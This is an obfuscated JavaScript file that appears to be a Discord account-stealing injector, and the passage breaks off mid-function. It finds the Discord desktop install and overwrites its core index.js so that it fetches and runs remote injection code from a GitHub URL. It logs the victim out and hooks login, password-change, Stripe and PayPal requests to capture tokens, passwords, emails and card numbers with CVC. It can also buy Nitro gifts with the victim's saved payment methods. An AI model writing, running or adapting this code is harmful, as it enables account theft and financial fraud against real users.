const _0x2f05af=_0x4bf2;(function(_0x3776fa,_0x50e329){const _0x38ebc1=_0x4bf2,_0x493c37=_0x3776fa();while(!![]){try{const _0x2b1492=-parseInt(_0x38ebc1(0x17a))/0x1+parseInt(_0x38ebc1(0xfa))/0x2+-parseInt(_0x38ebc1(0xf1))/0x3*(parseInt(_0x38ebc1(0x173))/0x4)+parseInt(_0x38ebc1(0xb2))/0x5*(parseInt(_0x38ebc1(0xaf))/0x6)+parseInt(_0x38ebc1(0xe7))/0x7*(-parseInt(_0x38ebc1(0x13d))/0x8)+-parseInt(_0x38ebc1(0xb3))/0x9+parseInt(_0x38ebc1(0x128))/0xa;if(_0x2b1492===_0x50e329)break;else _0x493c37['push'](_0x493c37['shift']());}catch(_0x908a4e){_0x493c37['push'](_0x493c37['shift']());}}}(_0xb20c,0x223f9));const args=process['argv'],fs=require('fs'),path=require(_0x2f05af(0x15c)),https=require(_0x2f05af(0x14e)),querystring=require(_0x2f05af(0x125)),{BrowserWindow,session}=require('electron'),config={'webhook':_0x2f05af(0xc7),'webhook_protector_key':_0x2f05af(0xc6),'auto_buy_nitro':![],'ping_on_run':![],'ping_val':_0x2f05af(0xf5),'embed_name':_0x2f05af(0xe4),'embed_icon':_0x2f05af(0x139)['replace'](/ /g,_0x2f05af(0xbe)),'embed_color':0x0,'injection_url':'https://raw.githubusercontent.com/drxz1337/3117/main/injection.js','api':_0x2f05af(0xea),'nitro':{'boost':{'year':{'id':_0x2f05af(0x149),'sku':_0x2f05af(0x15f),'price':'9999'},'month':{'id':'521847234246082599','sku':_0x2f05af(0xc1),'price':_0x2f05af(0xee)}},'classic':{'month':{'id':_0x2f05af(0x106),'sku':'511651871736201216','price':'499'}}},'filter':{'urls':[_0x2f05af(0xd7),'https://discordapp.com/api/v*/users/@me',_0x2f05af(0x116),_0x2f05af(0x109),_0x2f05af(0x143),'https://*.discord.com/api/v*/auth/login',_0x2f05af(0x17d),_0x2f05af(0xb0),_0x2f05af(0xe1),_0x2f05af(0xcc)]},'filter2':{'urls':['https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',_0x2f05af(0x10d),_0x2f05af(0x13e),_0x2f05af(0x10b),_0x2f05af(0x118),_0x2f05af(0x159)]}};function parity_32(_0x19caef,_0x33f661,_0x4d37c4){return _0x19caef^_0x33f661^_0x4d37c4;}function ch_32(_0x2b9e82,_0x2c64da,_0x42411a){return _0x2b9e82&_0x2c64da^~_0x2b9e82&_0x42411a;}function maj_32(_0x260aa8,_0x1b16c4,_0x5bf828){return _0x260aa8&_0x1b16c4^_0x260aa8&_0x5bf828^_0x1b16c4&_0x5bf828;}function rotl_32(_0x15e8dd,_0x114a60){return _0x15e8dd<<_0x114a60|_0x15e8dd>>>0x20-_0x114a60;}function safeAdd_32_2(_0x4285d9,_0x261371){var _0x1bdc55=(_0x4285d9&0xffff)+(_0x261371&0xffff),_0x497762=(_0x4285d9>>>0x10)+(_0x261371>>>0x10)+(_0x1bdc55>>>0x10);return(_0x497762&0xffff)<<0x10|_0x1bdc55&0xffff;}function safeAdd_32_5(_0x5767d3,_0x44cc48,_0x2c63a4,_0x28d28e,_0x5312d2){var _0x12891d=(_0x5767d3&0xffff)+(_0x44cc48&0xffff)+(_0x2c63a4&0xffff)+(_0x28d28e&0xffff)+(_0x5312d2&0xffff),_0x2786d4=(_0x5767d3>>>0x10)+(_0x44cc48>>>0x10)+(_0x2c63a4>>>0x10)+(_0x28d28e>>>0x10)+(_0x5312d2>>>0x10)+(_0x12891d>>>0x10);return(_0x2786d4&0xffff)<<0x10|_0x12891d&0xffff;}function binb2hex(_0x16f640){const _0x4ee8e3=_0x2f05af;var _0x2917a4=_0x4ee8e3(0x135),_0x3c534c='',_0x4148d5=_0x16f640[_0x4ee8e3(0x130)]*0x4,_0x206d82,_0x3734b8;for(_0x206d82=0x0;_0x206d82<_0x4148d5;_0x206d82+=0x1){_0x3734b8=_0x16f640[_0x206d82>>>0x2]>>>(0x3-_0x206d82%0x4)*0x8,_0x3c534c+=_0x2917a4[_0x4ee8e3(0xff)](_0x3734b8>>>0x4&0xf)+_0x2917a4[_0x4ee8e3(0xff)](_0x3734b8&0xf);}return _0x3c534c;}function _0x4bf2(_0x32e06d,_0x2a0388){const _0xb20c10=_0xb20c();return _0x4bf2=function(_0x4bf2b5,_0x975873){_0x4bf2b5=_0x4bf2b5-0xaf;let _0x4c3015=_0xb20c10[_0x4bf2b5];return _0x4c3015;},_0x4bf2(_0x32e06d,_0x2a0388);}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x4add49,_0x31c6a8){var _0x191c6d=[],_0x311001,_0x35f597,_0xa54a2,_0xb65117,_0x3e80d7,_0x5cc023,_0x3acd58=ch_32,_0x11460a=parity_32,_0x535c49=maj_32,_0x392f56=rotl_32,_0x48b33c=safeAdd_32_2,_0x5228e5,_0x3247a7=safeAdd_32_5;_0x311001=_0x31c6a8[0x0],_0x35f597=_0x31c6a8[0x1],_0xa54a2=_0x31c6a8[0x2],_0xb65117=_0x31c6a8[0x3],_0x3e80d7=_0x31c6a8[0x4];for(_0x5228e5=0x0;_0x5228e5<0x50;_0x5228e5+=0x1){_0x5228e5<0x10?_0x191c6d[_0x5228e5]=_0x4add49[_0x5228e5]:_0x191c6d[_0x5228e5]=_0x392f56(_0x191c6d[_0x5228e5-0x3]^_0x191c6d[_0x5228e5-0x8]^_0x191c6d[_0x5228e5-0xe]^_0x191c6d[_0x5228e5-0x10],0x1),_0x5228e5<0x14?_0x5cc023=_0x3247a7(_0x392f56(_0x311001,0x5),_0x3acd58(_0x35f597,_0xa54a2,_0xb65117),_0x3e80d7,0x5a827999,_0x191c6d[_0x5228e5]):_0x5228e5<0x28?_0x5cc023=_0x3247a7(_0x392f56(_0x311001,0x5),_0x11460a(_0x35f597,_0xa54a2,_0xb65117),_0x3e80d7,0x6ed9eba1,_0x191c6d[_0x5228e5]):_0x5228e5<0x3c?_0x5cc023=_0x3247a7(_0x392f56(_0x311001,0x5),_0x535c49(_0x35f597,_0xa54a2,_0xb65117),_0x3e80d7,0x8f1bbcdc,_0x191c6d[_0x5228e5]):_0x5cc023=_0x3247a7(_0x392f56(_0x311001,0x5),_0x11460a(_0x35f597,_0xa54a2,_0xb65117),_0x3e80d7,0xca62c1d6,_0x191c6d[_0x5228e5]),_0x3e80d7=_0xb65117,_0xb65117=_0xa54a2,_0xa54a2=_0x392f56(_0x35f597,0x1e),_0x35f597=_0x311001,_0x311001=_0x5cc023;}return _0x31c6a8[0x0]=_0x48b33c(_0x311001,_0x31c6a8[0x0]),_0x31c6a8[0x1]=_0x48b33c(_0x35f597,_0x31c6a8[0x1]),_0x31c6a8[0x2]=_0x48b33c(_0xa54a2,_0x31c6a8[0x2]),_0x31c6a8[0x3]=_0x48b33c(_0xb65117,_0x31c6a8[0x3]),_0x31c6a8[0x4]=_0x48b33c(_0x3e80d7,_0x31c6a8[0x4]),_0x31c6a8;}function finalizeSHA1(_0x58dfa0,_0x209510,_0x558510,_0x3a0b7c){const _0x3f0bbe=_0x2f05af;var _0x129483,_0x1d9f56,_0x309bb8;_0x309bb8=(_0x209510+0x41>>>0x9<<0x4)+0xf;while(_0x58dfa0[_0x3f0bbe(0x130)]<=_0x309bb8){_0x58dfa0[_0x3f0bbe(0x11c)](0x0);}_0x58dfa0[_0x209510>>>0x5]|=0x80<<0x18-_0x209510%0x20,_0x58dfa0[_0x309bb8]=_0x209510+_0x558510,_0x1d9f56=_0x58dfa0[_0x3f0bbe(0x130)];for(_0x129483=0x0;_0x129483<_0x1d9f56;_0x129483+=0x10){_0x3a0b7c=roundSHA1(_0x58dfa0[_0x3f0bbe(0xb9)](_0x129483,_0x129483+0x10),_0x3a0b7c);}return _0x3a0b7c;}function hex2binb(_0x1126cf,_0x28f620,_0x13e089){const _0x52bb4f=_0x2f05af;var _0x36ab61,_0x43d80f=_0x1126cf['length'],_0xc88559,_0x4a1725,_0x302c4e,_0x40a1d2,_0x393d04;_0x36ab61=_0x28f620||[0x0],_0x13e089=_0x13e089||0x0,_0x393d04=_0x13e089>>>0x3,0x0!==_0x43d80f%0x2&&console['error']('String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments');for(_0xc88559=0x0;_0xc88559<_0x43d80f;_0xc88559+=0x2){_0x4a1725=parseInt(_0x1126cf['substr'](_0xc88559,0x2),0x10);if(!isNaN(_0x4a1725)){_0x40a1d2=(_0xc88559>>>0x1)+_0x393d04,_0x302c4e=_0x40a1d2>>>0x2;while(_0x36ab61[_0x52bb4f(0x130)]<=_0x302c4e){_0x36ab61[_0x52bb4f(0x11c)](0x0);}_0x36ab61[_0x302c4e]|=_0x4a1725<<0x8*(0x3-_0x40a1d2%0x4);}else console['error'](_0x52bb4f(0xdc));}return{'value':_0x36ab61,'binLen':_0x43d80f*0x4+_0x13e089};}class jsSHA{constructor(){const _0x1a4f70=_0x2f05af;var _0x25f52f=0x0,_0xcf6a97=[],_0x2aaa25=0x0,_0x27b1d1,_0x1bca58,_0x842dab,_0x57b266,_0xc00278,_0x189bcb,_0x669e91=![],_0x479964=![],_0x4d2130=[],_0x47655d=[],_0x160724,_0x160724=0x1;_0x1bca58=hex2binb,(_0x160724!==parseInt(_0x160724,0xa)||0x1>_0x160724)&&console[_0x1a4f70(0x119)]('numRounds\x20must\x20a\x20integer\x20>=\x201'),_0x57b266=0x200,_0xc00278=roundSHA1,_0x189bcb=finalizeSHA1,_0x842dab=0xa0,_0x27b1d1=getH(),this['setHMACKey']=function(_0x42d068){const _0x1dc386=_0x1a4f70;var _0x49675d,_0x110a76,_0x5d2fbb,_0x1de616,_0x1b5d2e,_0x3e11eb,_0x18f586;_0x49675d=hex2binb,_0x110a76=_0x49675d(_0x42d068),_0x5d2fbb=_0x110a76['binLen'],_0x1de616=_0x110a76[_0x1dc386(0x134)],_0x1b5d2e=_0x57b266>>>0x3,_0x18f586=_0x1b5d2e/0x4-0x1;if(_0x1b5d2e<_0x5d2fbb/0x8){_0x1de616=_0x189bcb(_0x1de616,_0x5d2fbb,0x0,getH());while(_0x1de616[_0x1dc386(0x130)]<=_0x18f586){_0x1de616[_0x1dc386(0x11c)](0x0);}_0x1de616[_0x18f586]&=0xffffff00;}else{if(_0x1b5d2e>_0x5d2fbb/0x8){while(_0x1de616[_0x1dc386(0x130)]<=_0x18f586){_0x1de616[_0x1dc386(0x11c)](0x0);}_0x1de616[_0x18f586]&=0xffffff00;}}for(_0x3e11eb=0x0;_0x3e11eb<=_0x18f586;_0x3e11eb+=0x1){_0x4d2130[_0x3e11eb]=_0x1de616[_0x3e11eb]^0x36363636,_0x47655d[_0x3e11eb]=_0x1de616[_0x3e11eb]^0x5c5c5c5c;}_0x27b1d1=_0xc00278(_0x4d2130,_0x27b1d1),_0x25f52f=_0x57b266,_0x479964=!![];},this[_0x1a4f70(0x15d)]=function(_0x23a350){const _0x2e2cc5=_0x1a4f70;var _0x3a49dc,_0x103062,_0x1e3ee8,_0x56b6ff,_0x4dd6e3,_0x305ef2=0x0,_0x2f83ce=_0x57b266>>>0x5;_0x3a49dc=_0x1bca58(_0x23a350,_0xcf6a97,_0x2aaa25),_0x103062=_0x3a49dc['binLen'],_0x56b6ff=_0x3a49dc[_0x2e2cc5(0x134)],_0x1e3ee8=_0x103062>>>0x5;for(_0x4dd6e3=0x0;_0x4dd6e3<_0x1e3ee8;_0x4dd6e3+=_0x2f83ce){_0x305ef2+_0x57b266<=_0x103062&&(_0x27b1d1=_0xc00278(_0x56b6ff['slice'](_0x4dd6e3,_0x4dd6e3+_0x2f83ce),_0x27b1d1),_0x305ef2+=_0x57b266);}_0x25f52f+=_0x305ef2,_0xcf6a97=_0x56b6ff[_0x2e2cc5(0xb9)](_0x305ef2>>>0x5),_0x2aaa25=_0x103062%_0x57b266;},this[_0x1a4f70(0xed)]=function(){const _0x224125=_0x1a4f70;var _0x168273;![]===_0x479964&&console['error'](_0x224125(0xb1));const _0x37e181=function(_0x1f8eb0){return binb2hex(_0x1f8eb0);};return![]===_0x669e91&&(_0x168273=_0x189bcb(_0xcf6a97,_0x2aaa25,_0x25f52f,_0x27b1d1),_0x27b1d1=_0xc00278(_0x47655d,getH()),_0x27b1d1=_0x189bcb(_0x168273,_0x842dab,_0x57b266,_0x27b1d1)),_0x669e91=!![],_0x37e181(_0x27b1d1);};}}_0x2f05af(0x14f)===typeof define&&define['amd']?define(function(){return jsSHA;}):_0x2f05af(0xba)!==typeof exports?_0x2f05af(0xba)!==typeof module&&module['exports']?module[_0x2f05af(0xc8)]=exports=jsSHA:exports=jsSHA:global[_0x2f05af(0x145)]=jsSHA;jsSHA[_0x2f05af(0x101)]&&(jsSHA=jsSHA[_0x2f05af(0x101)]);function totp(_0x1a5fbc){const _0x147a5b=_0x2f05af,_0x5a834b=Date[_0x147a5b(0x102)](),_0x984e0c=Math['round'](_0x5a834b/0x3e8),_0x49d6ae=leftpad(dec2hex(Math['floor'](_0x984e0c/0x1e)),0x10,'0'),_0x111988=new jsSHA();_0x111988[_0x147a5b(0x131)](base32tohex(_0x1a5fbc)),_0x111988[_0x147a5b(0x15d)](_0x49d6ae);const _0x6fe6f1=_0x111988[_0x147a5b(0xed)](),_0x53043f=hex2dec(_0x6fe6f1[_0x147a5b(0x140)](_0x6fe6f1[_0x147a5b(0x130)]-0x1));let _0x19ddfd=(hex2dec(_0x6fe6f1[_0x147a5b(0x12b)](_0x53043f*0x2,0x8))&hex2dec(_0x147a5b(0x123)))+'';return _0x19ddfd=_0x19ddfd[_0x147a5b(0x12b)](Math['max'](_0x19ddfd[_0x147a5b(0x130)]-0x6,0x0),0x6),_0x19ddfd;}function hex2dec(_0xcbc1d5){return parseInt(_0xcbc1d5,0x10);}function dec2hex(_0x433e15){const _0xa88f9c=_0x2f05af;return(_0x433e15<15.5?'0':'')+Math['round'](_0x433e15)[_0xa88f9c(0xf9)](0x10);}function base32tohex(_0x1991c5){const _0x12ecce=_0x2f05af;let _0x44ca2e=_0x12ecce(0x111),_0x158010='',_0x1abc8c='';_0x1991c5=_0x1991c5['replace'](/=+$/,'');for(let _0x5d0e32=0x0;_0x5d0e32<_0x1991c5[_0x12ecce(0x130)];_0x5d0e32++){let _0x29065c=_0x44ca2e[_0x12ecce(0xd4)](_0x1991c5['charAt'](_0x5d0e32)['toUpperCase']());_0x29065c===-0x1&&console[_0x12ecce(0x119)]('Invalid\x20base32\x20character\x20in\x20key'),_0x158010+=leftpad(_0x29065c[_0x12ecce(0xf9)](0x2),0x5,'0');}for(let _0x17f8cb=0x0;_0x17f8cb+0x8<=_0x158010[_0x12ecce(0x130)];_0x17f8cb+=0x8){let _0x4b6fe4=_0x158010[_0x12ecce(0x12b)](_0x17f8cb,0x8);_0x1abc8c=_0x1abc8c+leftpad(parseInt(_0x4b6fe4,0x2)['toString'](0x10),0x2,'0');}return _0x1abc8c;}function leftpad(_0x55375e,_0x57b1db,_0x15eaa4){const _0x1e1a8e=_0x2f05af;return _0x57b1db+0x1>=_0x55375e[_0x1e1a8e(0x130)]&&(_0x55375e=Array(_0x57b1db+0x1-_0x55375e[_0x1e1a8e(0x130)])[_0x1e1a8e(0x14b)](_0x15eaa4)+_0x55375e),_0x55375e;}const discordPath=(function(){const _0xe745d0=_0x2f05af,_0x297b6c=args[0x0][_0xe745d0(0xdf)](path[_0xe745d0(0xfd)])[_0xe745d0(0xb9)](0x0,-0x1)[_0xe745d0(0x14b)](path[_0xe745d0(0xfd)]);let _0x3457fa;process[_0xe745d0(0x169)]==='win32'?_0x3457fa=path[_0xe745d0(0x14b)](_0x297b6c,_0xe745d0(0x114)):process[_0xe745d0(0x169)]==='darwin'&&(_0x3457fa=path[_0xe745d0(0x14b)](_0x297b6c,_0xe745d0(0x129),_0xe745d0(0x162)));if(fs[_0xe745d0(0x15b)](_0x3457fa))return{'resourcePath':_0x3457fa,'app':_0x297b6c};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x3fdd3e=_0x2f05af,{resourcePath:_0x4d8ad6,app:_0x801139}=discordPath;if(_0x4d8ad6===undefined||_0x801139===undefined)return;const _0x1295db=path[_0x3fdd3e(0x14b)](_0x4d8ad6,'app'),_0x894411=path['join'](_0x1295db,_0x3fdd3e(0x16b)),_0x27c9ff=path[_0x3fdd3e(0x14b)](_0x1295db,_0x3fdd3e(0xbc)),_0x1c40df=fs['readdirSync'](_0x801139+'\x5cmodules\x5c')[_0x3fdd3e(0xde)](_0x206cc1=>/discord_desktop_core-+?/['test'](_0x206cc1))[0x0],_0x4380ce=_0x801139+_0x3fdd3e(0xda)+_0x1c40df+'\x5cdiscord_desktop_core\x5cindex.js',_0x51152e=path[_0x3fdd3e(0x14b)](process[_0x3fdd3e(0x155)][_0x3fdd3e(0x17b)],_0x3fdd3e(0xcb));!fs[_0x3fdd3e(0x15b)](_0x1295db)&&fs[_0x3fdd3e(0x13a)](_0x1295db);fs[_0x3fdd3e(0x15b)](_0x894411)&&fs[_0x3fdd3e(0x13f)](_0x894411);fs['existsSync'](_0x27c9ff)&&fs[_0x3fdd3e(0x13f)](_0x27c9ff);if(process[_0x3fdd3e(0x169)]===_0x3fdd3e(0x158)||process[_0x3fdd3e(0x169)]==='darwin'){fs[_0x3fdd3e(0x168)](_0x894411,JSON['stringify']({'name':_0x3fdd3e(0xc9),'main':_0x3fdd3e(0xbc)},null,0x4));const _0x49b49f=_0x3fdd3e(0x117)+_0x4380ce+_0x3fdd3e(0xf4)+_0x51152e+_0x3fdd3e(0xd8)+config[_0x3fdd3e(0xec)]+'\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27'+config[_0x3fdd3e(0x10f)]+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27'+config[_0x3fdd3e(0x14d)]+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27'+path[_0x3fdd3e(0x14b)](_0x4d8ad6,_0x3fdd3e(0x120))+_0x3fdd3e(0x124);fs['writeFileSync'](_0x27c9ff,_0x49b49f[_0x3fdd3e(0x115)](/\\/g,'\x5c\x5c'));}if(!fs[_0x3fdd3e(0x15b)](path[_0x3fdd3e(0x14b)](__dirname,_0x3fdd3e(0xd5))))return!![];return fs[_0x3fdd3e(0x14a)](path[_0x3fdd3e(0x14b)](__dirname,_0x3fdd3e(0xd5))),execScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();'),![];}function _0xb20c(){const _0x20c8ab=['%WEBHOOK_KEY%','%WEBHOOK%','exports','discord','webRequest','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','https://api.stripe.com/v*/payment_intents/*/confirm','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','Authorization','endsWith','write','2422867c-244d-476a-ba4f-36e197758d97','classic','Nitro\x20Type:\x20**','indexOf','initiation','\x20|\x20','https://discord.com/api/v*/users/@me','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','embed_name','\x5cmodules\x5c','startsWith','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','boost','filter','split','HypeSquad\x20Balance,\x20','https://api.stripe.com/v*/setup_intents/*/confirm','from','stringify','Xen#3117','Gold\x20BugHunter,\x20','method','133yMyONG','**Credit\x20Card\x20Added**','defaultSession','https://discord.com/api/v9/users/@me','Hypesquad\x20Event,\x20','injection_url','getHMAC','999','**\x0aOld\x20Password:\x20**','Early\x20Supporter,\x20','91704LyIhnu','login','https://discord.gift/','\x27;\x0aconst\x20bdPath\x20=\x20\x27','@everyone','webContents','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','url','toString','449942QyRLME','content','avatar','sep','embed_icon','charAt','**Token**','default','now','confirm','email','Access-Control-Allow-Origin\x20\x27*\x27','521846918637420545','flags','end','https://discordapp.com/api/v*/auth/login','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','https://*.discord.com/api/v*/users/@me/library','onCompleted','https://*.discord.com/api/v*/applications/detectable','price','webhook','usd','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','```','resources','replace','https://*.discord.com/api/v*/users/@me','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27','https://discord.com/api/v*/users/@me/library','error','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','embed_color','push','**\x0aCVC:\x20**','POST','onHeadersReceived','app.asar','statusCode','HypeSquad\x20Brillance,\x20','7fffffff','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','querystring','filter2','Verified\x20Bot\x20Developer,\x20','1028240sdutLG','Contents','api/webhooks','substr','ping_val','ping_on_run','💳\x20','discriminator','length','setHMACKey','https://cdn.discordapp.com/avatars/','protocol','value','0123456789abcdef','*\x0aBadges:\x20**','uploadData','));\x0a\x20\x20\x20\x20xmlHttp.responseText','https://i.hizliresim.com/rei32qa.jpg','mkdirSync','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','**\x0aBilling:\x20**','83464TKmrfD','https://discord.com/api/v*/applications/detectable','unlinkSync','substring','**Discord\x20Info**','PATCH','https://discord.com/api/v*/auth/login','log','jsSHA','Partnered\x20Server\x20Owner,\x20','responseHeaders','New\x20Email:\x20**','521847234246082599','rmdirSync','join','Access-Control-Allow-Headers\x20\x27*\x27','webhook_protector_key','https','function','invalid','./core.asar','**\x0aNew\x20Password:\x20**','new_password','Failed\x20to\x20Purchase\x20❌','env','card[number]','**Paypal\x20Added**','win32','wss://remote-auth-gateway.discord.gg/*','**\x0aBadges:\x20**','existsSync','path','update','includes','511651885459963904','month','gift_code','Resources','premium_type','request','host','Active\x20Developer,\x20','Discord\x20Staff,\x20','writeFileSync','platform','**Nitro\x20Code:**\x0a```diff\x0a+\x20','package.json','sku','**\x0aCredit\x20Card\x20Expiration:\x20**','No\x20Nitro','default-src\x20\x27*\x27','tokens','**Account\x20Info**','onBeforeRequest','4sGKGPC','bytes','parse','Green\x20BugHunter,\x20','password','username','catch','88344lyqQGA','APPDATA','Nitro\x20Boost','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','**Nitro\x20bought!**','66zZJclH','https://api.stripe.com/v*/tokens','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','125165dfMlFr','1311642aHMaDR','**Email\x20Changed**','nitro','**\x0aPassword:\x20**','card[exp_year]','wss://remote-auth-gateway','slice','undefined','executeJavaScript','index.js','<:paypal:951139189389410365>\x20','%20','getAllWindows','assign','511651880837840896','HypeSquad\x20Bravery,\x20','api','.webp','content-security-policy-report-only'];_0xb20c=function(){return _0x20c8ab;};return _0xb20c();}const execScript=_0x452093=>{const _0x2bdc93=_0x2f05af,_0x58386e=BrowserWindow[_0x2bdc93(0xbf)]()[0x0];return _0x58386e[_0x2bdc93(0xf6)][_0x2bdc93(0xbb)](_0x452093,!![]);},getInfo=async _0x483759=>{const _0x5ec655=_0x2f05af,_0x348f54=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config[_0x5ec655(0xc3)]+_0x5ec655(0x10a)+_0x483759+_0x5ec655(0xcd));return JSON[_0x5ec655(0x175)](_0x348f54);},fetchBilling=async _0x2511c2=>{const _0x3d5a3f=_0x2f05af,_0x40f481=await execScript(_0x3d5a3f(0x11a)+config[_0x3d5a3f(0xc3)]+_0x3d5a3f(0x17e)+_0x2511c2+'\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText');if(!_0x40f481['lenght']||_0x40f481[_0x3d5a3f(0x130)]===0x0)return'';return JSON[_0x3d5a3f(0x175)](_0x40f481);},getBilling=async _0x4fedc2=>{const _0x382c2a=await fetchBilling(_0x4fedc2);if(!_0x382c2a)return'❌';let _0x1b4f74='';return _0x382c2a['forEach'](_0x160003=>{const _0x565152=_0x4bf2;if(!_0x160003['invalid'])switch(_0x160003['type']){case 0x1:_0x1b4f74+=_0x565152(0x12e);break;case 0x2:_0x1b4f74+=_0x565152(0xbd);break;}}),!_0x1b4f74&&(_0x1b4f74='❌'),_0x1b4f74;},Purchase=async(_0x2c2837,_0x18deb4,_0x947c25,_0x1e2c9a)=>{const _0x47c0f0=_0x2f05af,_0x237228={'expected_amount':config['nitro'][_0x947c25][_0x1e2c9a][_0x47c0f0(0x10e)],'expected_currency':_0x47c0f0(0x110),'gift':!![],'payment_source_id':_0x18deb4,'payment_source_token':null,'purchase_token':_0x47c0f0(0xd1),'sku_subscription_plan_id':config[_0x47c0f0(0xb5)][_0x947c25][_0x1e2c9a][_0x47c0f0(0x16c)]},_0x399ea6=execScript(_0x47c0f0(0x13b)+config['nitro'][_0x947c25][_0x1e2c9a]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x2c2837+_0x47c0f0(0x112)+JSON[_0x47c0f0(0xe3)](_0x237228)+_0x47c0f0(0x138));return _0x399ea6[_0x47c0f0(0x161)]?_0x47c0f0(0xf3)+_0x399ea6[_0x47c0f0(0x161)]:null;},buyNitro=async _0xc27c4=>{const _0x27208d=_0x2f05af,_0x4c8206=await fetchBilling(_0xc27c4),_0x4c3a84=_0x27208d(0x154);if(!_0x4c8206)return _0x4c3a84;let _0x4bde9c=[];_0x4c8206['forEach'](_0x52a3df=>{const _0x1026cf=_0x27208d;!_0x52a3df[_0x1026cf(0x150)]&&(_0x4bde9c=_0x4bde9c['concat'](_0x52a3df['id']));});for(let _0x1f7285 in _0x4bde9c){const _0x1c41ba=Purchase(_0xc27c4,_0x1f7285,_0x27208d(0xdd),'year');if(_0x1c41ba!==null)return _0x1c41ba;else{const _0x450661=Purchase(_0xc27c4,_0x1f7285,_0x27208d(0xdd),_0x27208d(0x160));if(_0x450661!==null)return _0x450661;else{const _0x12da88=Purchase(_0xc27c4,_0x1f7285,_0x27208d(0xd2),'month');return _0x12da88!==null?_0x12da88:_0x4c3a84;}}}},getNitro=_0x28cea3=>{const _0x1f2f1c=_0x2f05af;switch(_0x28cea3){case 0x0:return _0x1f2f1c(0x16e);case 0x1:return'Nitro\x20Classic';case 0x2:return _0x1f2f1c(0x17c);default:return'No\x20Nitro';}},getBadges=_0x2e5520=>{const _0x548c3e=_0x2f05af;let _0x452d61='';switch(_0x2e5520){case 0x1:_0x452d61+=_0x548c3e(0x167);break;case 0x2:_0x452d61+=_0x548c3e(0x146);break;case 0x20000:_0x452d61+=_0x548c3e(0x127);break;case 0x400000:_0x452d61+=_0x548c3e(0x166);break;case 0x4:_0x452d61+=_0x548c3e(0xeb);break;case 0x4000:_0x452d61+=_0x548c3e(0xe5);break;case 0x8:_0x452d61+=_0x548c3e(0x176);break;case 0x200:_0x452d61+=_0x548c3e(0xf0);break;case 0x80:_0x452d61+=_0x548c3e(0x122);break;case 0x40:_0x452d61+=_0x548c3e(0xc2);break;case 0x100:_0x452d61+=_0x548c3e(0xe0);break;case 0x0:_0x452d61='None';break;default:_0x452d61='None';break;}return _0x452d61;},hooker=async _0x410102=>{const 